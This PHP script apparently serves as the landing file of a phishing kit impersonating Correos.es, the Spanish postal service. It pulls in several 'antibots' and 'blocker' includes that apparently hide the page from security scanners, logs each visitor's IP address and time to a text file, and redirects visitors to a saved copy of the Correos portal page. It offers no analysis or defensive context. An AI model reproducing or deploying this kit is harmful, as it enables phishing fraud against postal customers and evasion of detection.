<?php 
include "./boots/antibots1.php";
include "./boots/antibots2.php";
include "./boots/antibots3.php";
include "./boots/antibots4.php";
include "./boots/antibots5.php";
include "./boots/antibots6.php";
include "./boots/blocker.php";

$ip = getenv("REMOTE_ADDR");
$file = fopen("Vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="Bienvenido a Correos.es - El Portal Online de Correos.html";
header("location:$src");
?>